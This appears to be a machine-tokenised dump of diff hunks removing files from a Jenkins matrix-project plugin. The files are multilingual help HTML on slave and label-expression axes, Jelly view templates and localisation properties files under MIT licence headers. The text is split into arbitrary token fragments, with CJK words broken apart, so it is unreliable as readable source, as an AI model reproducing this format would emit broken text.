"&", "#", "287", ";", "ine", "dair", "daha", "fazla", "bilgi", "i", "&", "#", "231", ";", "in", ",", "a", "&", "#", "351", ";", "a", "&", "#", "287", ";", "&#", "305", ";", "da", "\"", "eksenler", "\"", "ile", "ilgili", "yard", "&", "#", "305", ";", "m", "k", "&", "#", "305", ";", "sm", "&", "#", "305", ";", "na", "bak", "&", "#", "305", ";", "n", "&", "#", "305", ";", "z", ".", "<", "/", "div", ">", "@", "@", "-", "1", ",", "21", "+", "0", ",", "0", "@", "@", "<", "div", ">", "\u6307", "\u5b9a\u5efa", "\u7f6e\u7528", "\u7684\u7bc0", "\u9ede\u3002", "<", "ul", ">", "<", "li", ">", "\u5982", "\u679c\u6c92", "\u6709\u9078", "\u53d6\u4efb", "\u4f55\u7bc0", "\u9ede\uff0c", "Jenkins", "\u6703", "\u81ea\u52d5", "\u6311\u4e00", "\u500b\u7bc0", "\u9ede\u4f86", "\u5efa\u7f6e", "(", "\u884c\u70ba", "\u6a21\u5f0f", "\u5c31\u50cf", "\u662f\u6c92", "\u6709\u4f7f", "\u7528\u300c", "\u9650\u5b9a", "\u5efa\u7f6e", "\u7bc0\u9ede", "\u300d\u7684", "Free", "-", "Style", "\u5c08", "\u6848)", "\u3002", "\u5982", "\u679c\u5c08", "\u6848\u4e0d", "\u4e00\u5b9a", "\u8981\u5728", "\u54ea\u4e9b", "\u7bc0\u9ede", "\u4e0a\u624d", "\u80fd\u5efa", "\u7f6e\uff0c", "\u4f7f\u7528", "\u9019\u500b", "\u65b9\u5f0f", "\u53ef\u4ee5", "\u8b93", "Jenkins", "\u5145", "\u5206\u5229", "\u7528\u6bcf", "\u500b\u7bc0", "\u9ede\u3002", "<", "li", ">", "\u5982", "\u679c\u9078", "\u5b9a\u67d0", "\u500b\u7bc0", "\u9ede\uff0c", "Jenkins", "\u5c31", "\u53ea\u6703", "\u5728\u90a3", "\u500b\u7bc0", "\u9ede\u4e0a", "\u5efa\u7f6e", "(", "\u5047\u8a2d", "\u60a8\u662f", "\u5728\u300c", "\u7368\u7acb", "\u7bc0\u9ede", "\u300d\u4e2d", "\u6311\u51fa", "\u4f86\u7684", ")\uff0c", "\u6216", "\u662f\u5728", "\u6307\u5b9a", "\u6a19\u7c64", "\u4e2d\u7684", "\u4efb\u4f55", "\u4e00\u500b", "\u7bc0\u9ede", "\u4e0a\u5efa", "\u7f6e", "(", "\u5047\u5982", "\u60a8\u662f", "\u7531\u300c", "\u6a19\u7c64", "\u300d\u4e2d", "\u9078\u7684", ")\u3002", "\u9019", "\u7a2e\u8a2d", "\u5b9a\u65b9", "\u5f0f\u5f88", "\u9069\u5408", "\u53ea\u80fd", "\u5728\u7279", "\u5b9a\u96fb", "\u8166\u4e0a", "\u57f7\u884c", "\u7684\u5efa", "\u7f6e\u4f5c", "\u696d\u3002", "\u4f8b\u5982", "\uff0c\u4e00", "\u5b9a\u8981", "MacOS", "X", "\u624d", "\u80fd\u5efa", "\u7f6e\u7684", "\u6771\u897f", "\u3002", "<", "li", ">", "\u5982", "\u679c\u9078", "\u53d6\u4e86", "\u4e00\u500b", "\u4ee5\u4e0a", "\u7684\u503c", "\uff0c\u8a2d", "\u5b9a\u77e9", "\u9663\u6703", "\u5c07\u6240", "\u6709\u6307", "\u5b9a\u7684", "\u9805\u76ee", "\u7d0d\u5165", "\u5c55\u958b", "\uff0c\u6240", "\u6709\u727d", "\u6d89\u5230", "\u7684\u7bc0", "\u9ede\u6216", "\u6a19\u7c64", "\u90fd\u6703", "\u5efa\u7f6e", "\u3002", "\u8209", "\u4f8b\u4f86", "\u8aaa\uff0c", "\u5982\u679c", "\u60a8\u60f3", "\u5728", "Windows", ",", "Linux", "\u53ca", "Solaris", "\u4e0a", "\u9762\u90fd", "\u57f7\u884c", "\u6e2c\u8a66", "\u7684\u8a71", "\uff0c\u9019", "\u4e00\u62db", "\u5c31\u5f88", "\u6709\u7528", "\u3002", "<", "/", "ul", ">", "<", "br", ">", "\u5efa", "\u7f6e\u6642", "\u7684\u7bc0", "\u9ede\u6216", "\u6a19\u7c64", "\u540d\u7a31", "\u6703\u986f", "\u793a\u5728", "\u300c\u6a19", "\u7c64\u300d", "\u8ef8\u7dda", "\u4e0a\u3002", "\u53c3", "\u8003\u4e0b", "\u65b9\u300c", "\u5ea7\u6a19", "\u8ef8\u300d", "\u7684\u8aaa", "\u660e\uff0c", "\u53ef\u4ee5", "\u77e5\u9053", "\u600e\u9ebc", "\u770b\u5ea7", "\u6a19\u503c", "\u3002", "<", "/", "div", ">", "@", "@", "-", "1", ",", "5", "+", "0", ",", "0", "@", "@", "<", "div", ">", "This", "axis", "lets", "you", "run", "the", "same", "build", "on", "multiple", "slaves", "(", "by", "specifying", "those", "slaves", "either", "by", "their", "labels", "or", "their", "individual", "names", ".", ")", "This", "is", "useful", "for", "example", "to", "cross", "-", "compile", "your", "C", "projects", "on", "multiple", "platforms", ",", "testing", "your", "Java", "projects", "on", "different", "OSes", ",", "and", "so", "on", ".", "<", "/", "div", ">", "<", "div", ">", "\u53ef", "\u4ee5\u5728", "\u4e0d\u540c", "Slave", "\u4e0a", "\u5efa\u7f6e", "\u4f5c\u696d", "\u7684\u8ef8", "\u7dda", "(", "\u53ef\u4ee5", "\u4f9d\u7167", "\u6a19\u7c64", "\u6216\u662f", "\u7368\u7acb", "\u540d\u7a31", "\u6307\u5b9a", "Slave", ")", "\u3002", "\u8209", "\u4f8b\u4f86", "\u8aaa\uff0c", "\u53ef\u4ee5", "\u5f88\u65b9", "\u4fbf\u7684", "\u8b93\u60a8", "\u5728\u4e0d", "\u540c\u5e73", "\u53f0\u4e0a", "\u7de8\u8b6f", "C", "\u5c08", "\u6848\uff0c", "\u4e5f\u53ef", "\u4ee5\u5728", "\u4e0d\u540c", "\u4f5c\u696d", "\u7cfb\u7d71", "\u4e0a\u6e2c", "\u8a66", "Java", "\u5c08", "\u6848\u3002", "<", "/", "div", ">", "<", "!", "The", "MIT", "License", "Copyright", "(", "c", ")", "2010", ",", "InfraDNA", ",", "Inc", ".", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "THE", "SOFTWARE", ".", ">", "<", "?", "jelly", "escape", "-", "by", "-", "default", "=", "'", "true", "'", "?>", "<", "j", ":", "jelly", "xmlns", ":", "j", "=", "\"", "jelly", ":", "core", "\"", "xmlns", ":", "st", "=", "\"", "jelly", ":", "stapler", "\"", "xmlns", ":", "d", "=", "\"", "jelly", ":", "define", "\"", "xmlns", ":", "l", "=", "\"/", "lib", "/", "layout", "\"", "xmlns", ":", "t", "=", "\"/", "lib", "/", "hudson", "\"", "xmlns", ":", "f", "=", "\"/", "lib", "/", "form", "\"", "xmlns", ":", "i", "=", "\"", "jelly", ":", "fmt", "\"", "xmlns", ":", "p", "=", "\"/", "lib", "/", "hudson", "/", "project", "\"", ">", "<", "f", ":", "entry", "title", "=", "\"$", "{%", "Name", "}", "\"", "field", "=", "\"", "name", "\"", ">", "<", "f", ":", "textbox", "default", "=", "\"", "label_exp", "\"", "/", ">", "<", "/", "f", ":", "entry", ">", "<", "f", ":", "entry", "title", "=", "\"$", "{%", "Label", "Expressions", "}", "\"", "field", "=", "\"", "labelExpr", "\"", ">", "<", "f", ":", "textarea", "name", "=", "\"", "values", "\"", "value", "=", "\"$", "{", "instance", ".", "getValuesString", "(", ")}", "\"", "autoCompleteDelimChar", "=", "\"", "\"", "/>", "<", "/", "f", ":", "entry", ">", "<", "/", "j", ":", "jelly", ">", "@", "@", "-", "1", ",", "24", "+", "0", ",", "0", "@", "@", "#", "The", "MIT", "License", "#", "#", "Copyright", "(", "c", ")", "2004", "-", ",", "Kohsuke", "Kawaguchi", ",", "Sun", "Microsystems", ",", "Inc", ".", ",", "and", "a", "number", "of", "other", "of", "contributers", "#", "#", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "#", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "#", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "#", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "#", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "#", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "#", "#", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "#", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "#", "#", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "#", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "#", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "#", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "#", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "#", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "#", "THE", "SOFTWARE", ".", "Label", "\\", "Expressions", "=", "Expresiones", "Name", "=", "Nombre", "@", "@", "-", "1", ",", "25", "+", "0", ",", "0", "@", "@", "#", "The", "MIT", "License", "#", "#", "Copyright", "(", "c", ")", "2011", ",", "Seiji", "Sogabe", "#", "#", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "#", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "#", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "#", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "#", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "#", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "#", "#", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "#", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "#", "#", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "#", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "#", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "#", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "#", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "#", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "#", "THE", "SOFTWARE", ".", "Name", "=", "\\", "u540d", "\\", "u524d", "Label", "\\", "Expressions", "=", "\\", "u30e9", "\\", "u30d9", "\\", "u30eb", "\\", "u5f0f", "@", "@", "-", "1", ",", "25", "+", "0", ",", "0", "@", "@", "#", "The", "MIT", "License", "#", "#", "Copyright", "(", "c", ")", "2004", "-", ",", "Kohsuke", "Kawaguchi", ",", "Sun", "Microsystems", ",", "Inc", ".", ",", "and", "a", "number", "of", "other", "of", "contributers", "#", "#", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "#", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "#", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "#", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "#", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "#", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "#", "#", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "#", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "#", "#", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "#", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "#", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "#", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "#", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "#", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "#", "THE", "SOFTWARE", ".", "Label", "\\", "Expressions", "=", "Express", "\\", "u00f5es", "Name", "=", "Nome", "@", "@", "-", "1", ",", "24", "+", "0", ",", "0", "@", "@", "#", "The", "MIT", "License", "#", "#", "Copyright", "(", "c", ")", "2013", ",", "Chunghwa", "Telecom", "Co", ".", ",", "Ltd", ".", ",", "Pei", "-", "Tang", "Huang", "#", "#", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "#", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "#", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "#", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "#", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "#", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "#", "#", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "#", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "#", "#", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "#", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "#", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "#", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "#", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "#", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "#", "THE", "SOFTWARE", ".", "Name", "=", "\\", "u540d", "\\", "u7a31", "Label", "\\", "Expressions", "=", "\\", "u6a19", "\\", "u7c64", "\\", "u8868", "\\", "u793a", "\\", "u5f0f", "@", "@", "-", "1", ",", "4", "+", "0", ",", "0", "@", "@", "<", "div", ">", "This", "is", "similar", "to", "\"", "Slave", "\"", "axis", ",", "but", "you", "can", "use", "label", "expressions", ",", "not", "just", "plain", "label", "names", ".", "Each", "line", "represents", "one", "label", "expression", "(", "i", ".", "e", ".", "one", "value", "of", "this", "axis", ")", ".", "<", "/", "div", ">", "<", "div", ">", "\"", "\u30b9\u30ec", "\u30fc\u30d6", "\"\u306e", "\u8ef8\u3068", "\u540c\u69d8", "\u3067\u3059", "\u304c\u3001", "\u5358\u306a", "\u308b\u30e9", "\u30d9\u30eb", "\u540d\u3060", "\u3051\u3067", "\u306a\u304f", "\u30e9\u30d9", "\u30eb\u5f0f", "\u3092\u4f7f", "\u7528\u3059", "\u308b\u3053", "\u3068\u304c", "\u3067\u304d", "\u307e\u3059", "\u3002", "1", "\u884c", "\u304c", "1", "\u3064", "\u306e\u30e9", "\u30d9\u30eb", "\u5f0f\u3092", "\u8868\u3057", "\u307e\u3059", "(\u3053", "\u306e\u8ef8", "\u306e\u5024", ")\u3002", "<", "/", "div", ">", "<", "div", ">", "\u5f88", "\u50cf\u300c", "Slave", "\u300d", "\u8ef8\uff0c", "\u4e0d\u904e", "\u9664\u4e86", "\u4f7f\u7528", "\u6a19\u7c64", "\u540d\u7a31", "\u4e4b\u5916", "\uff0c\u60a8", "\u9084\u53ef", "\u4ee5\u7528", "\u6a19\u7c64", "\u8868\u793a", "\u5f0f\u3002", "\u4e00", "\u884c\u4ee3", "\u8868\u4e00", "\u500b\u8868", "\u793a\u5f0f", "(", "\u540c\u6642", "\u4e5f\u662f", "\u5c0d\u61c9", "\u5230\u8ef8", "\u7dda\u4e0a", "\u7684\u4e00", "\u500b\u503c", ")\u3002", "<", "/", "div", ">", "<", "div", ">", "This", "axis", "lets", "you", "run", "the", "same", "build", "on", "multiple", "slaves", "(", "much", "like", "the", "\"", "slaves", "\"", "axis", ")", ",", "but", "this", "is", "more", "advanced", "in", "that", "it", "lets", "you", "use", "boolean", "expressions", "(", "such", "as", "<", "tt", ">", "foo", "&", "amp", ";", "&", "amp", ";", "bar", "<", "/", "tt", ">", ")", "<", "/", "div", ">", "<", "div", ">", "\u3053", "\u306e\u8ef8", "\u306f\u3001", "\u540c\u4e00", "\u306e\u30d3", "\u30eb\u30c9", "\u3092\u8907", "\u6570\u306e", "\u30b9\u30ec", "\u30fc\u30d6", "\u3067\u5b9f", "\u884c\u3059", "\u308b\u3053", "\u3068\u304c", "\u3067\u304d", "\u307e\u3059", "(\"", "\u30b9\u30ec", "\u30fc\u30d6", "\"\u306e", "\u8ef8\u3068", "\u540c\u69d8", "\u306b)", "\u3002", "\u3057", "\u304b\u3057", "\u3001\u8ad6", "\u7406\u5f0f", "(\u4f8b", "<", "tt", ">", "foo", "&", "amp", ";", "&", "amp", ";", "bar", "<", "/", "tt", ">", ")\u3092", "\u4f7f\u7528", "\u3067\u304d", "\u308b\u70b9", "\u3067\u3088", "\u308a\u4fbf", "\u5229\u306b", "\u306a\u3063", "\u3066\u3044", "\u307e\u3059", "\u3002", "<", "/", "div", ">", "<", "div", ">", "\u53ef", "\u4ee5\u5728", "\u591a\u500b", "\u7bc0\u9ede", "\u4e0a\u9762", "\u57f7\u884c", "\u76f8\u540c", "\u5efa\u7f6e", "\u7684\u8ef8", "\u7dda\u3002", "\u5f88", "\u50cf\u300c", "Slave", "\u300d", "\u8ef8\uff0c", "\u4f46\u66f4", "\u9032\u968e", "\u3002\u60a8", "\u53ef\u4ee5", "\u7528\u5e03", "\u6797\u8868", "\u793a\u5f0f", "(", "\u4f8b\u5982", "<", "tt", ">", "foo", "&", "amp", ";", "&", "amp", ";", "bar", "<", "/", "tt", ">", ")\u3002", "<", "/", "div", ">", "<", "!", "The", "MIT", "License", "Copyright", "(", "c", ")", "2004", "-", "2009", ",", "Sun", "Microsystems", ",", "Inc", ".", ",", "Kohsuke", "Kawaguchi", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "THE", "SOFTWARE", ".", ">", "<", "!", "Used", "to", "asynchronously", "update", "executor", "queue", ">", "<", "?", "jelly", "escape", "-", "by", "-", "default", "=", "'", "true", "'", "?>", "<", "j", ":", "jelly", "xmlns", ":", "j", "=", "\"", "jelly", ":", "core", "\"", "xmlns", ":", "st", "=", "\"", "jelly", ":", "stapler", "\"", "xmlns", ":", "d", "=", "\"", "jelly", ":", "define", "\"", "xmlns", ":", "l", "=", "\"/", "lib", "/", "layout", "\"", "xmlns", ":", "t", "=", "\"/", "lib", "/", "hudson", "\"", "xmlns", ":", "s", "=", "\"/", "lib", "/", "form", "\"", "xmlns", ":", "p", "=", "\"/", "lib", "/", "hudson", "/", "project", "\"", ">", "<", "l", ":", "ajax", ">", "<", "p", ":", "matrix", "autoRefresh", "=", "\"$", "{", "it", ".", "isBuilding", "(", ")}", "\">", "<", "j", ":", "set", "var", "=", "\"", "b", "\"", "value", "=", "\"$", "{", "p", ".", "run", "}", "\"", "/", ">", "<", "j", ":", "choose", ">", "<", "j", ":", "when", "test", "=", "\"$", "{", "b", "=", "=", "null", "}", "\">", "<", "img", "src", "=", "\"$", "{", "imagesURL", "}", "/", "24x24", "/", "grey", ".", "png", "\"", "tooltip", "=", "\"$", "{%", "Not", "run", "}", "\"", "alt", "=", "\"$", "{%", "Not", "run", "}", "\"", "height", "=", "\"", "24", "\"", "width", "=", "\"", "24", "\"", "/>", "<", "/", "j", ":", "when", ">", "<", "j", ":", "otherwise", ">", "<", "a", "href", "=", "\"$", "{", "p", ".", "nearestRunUrl", "}", "\"", "class", "=", "\"", "model", "-", "link", "inside", "\"", ">", "<", "img", "src", "=", "\"$", "{", "imagesURL", "}", "/", "24x24", "/", "${", "b", ".", "buildStatusUrl", "}", "\"", "tooltip", "=", "\"$", "{", "p", ".", "tooltip", "}", "$", "{", "it", ".", "number", "!", "=", "b", ".", "number", "?", "(", "it", ".", "isBuilding", "(", ")?", "'-", "pending", "'", ":", "'", "-", "skipped", "'", "):", "''", "}\"", "alt", "=", "\"$", "{", "p", ".", "tooltip", "}", "\"", "style", "=", "\"$", "{", "it", ".", "number", "!", "=", "b", ".", "number", "?", "'", "opacity", ":", "0", ".", "5", "'", ":'", "'}", "\"", "height", "=", "\"", "24", "\"", "width", "=", "\"", "24", "\"", "/>", "<", "j", ":", "if", "test", "=", "\"$", "{", "empty", "(", "o", ".", "x", ")", "and", "empty", "(", "o", ".", "y", ")", "}\"", ">", "$", "{", "p", ".", "combination", ".", "toString", "(", "o", ".", "z", ")", "}", "<", "/", "j", ":", "if", ">", "<", "/", "a", ">", "<", "/", "j", ":", "otherwise", ">", "<", "/", "j", ":", "choose", ">", "<", "/", "p", ":", "matrix", ">", "<", "/", "l", ":", "ajax", ">", "<", "/", "j", ":", "jelly", ">", "@", "@", "-", "1", ",", "23", "+", "0", ",", "0", "@", "@", "#", "The", "MIT", "License", "#", "#", "Copyright", "(", "c", ")", "2004", "-", "2010", ",", "Sun", "Microsystems", ",", "Inc", ".", "Kohsuke", "Kawaguchi", ".", "Knud", "Poulsen", ".", "#", "#", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "#", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "#", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "#", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "#", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "#", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "#", "#", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "#", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "#", "#", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "#", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "#", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "#", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "#", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "#", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "#", "THE", "SOFTWARE", ".", "Not", "\\", "run", "=", "Ikke", "k", "\\", "u00f8rt", "@", "@", "-", "1", "+", "0", ",", "0", "@", "@", "Not", "\\", "run", "=", "Nicht", "gelaufen", "@", "@", "-", "1", ",", "23", "+", "0", ",", "0", "@", "@", "#", "The", "MIT", "License", "#", "#", "Copyright", "(", "c", ")", "2004", "-", "2010", ",", "Sun", "Microsystems", ",", "Inc", ".", "#", "#", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "#", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "#", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "#", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "#", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "#", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "#", "#", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "#", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "#", "#", "THE", "SOFTWARE", "IS", 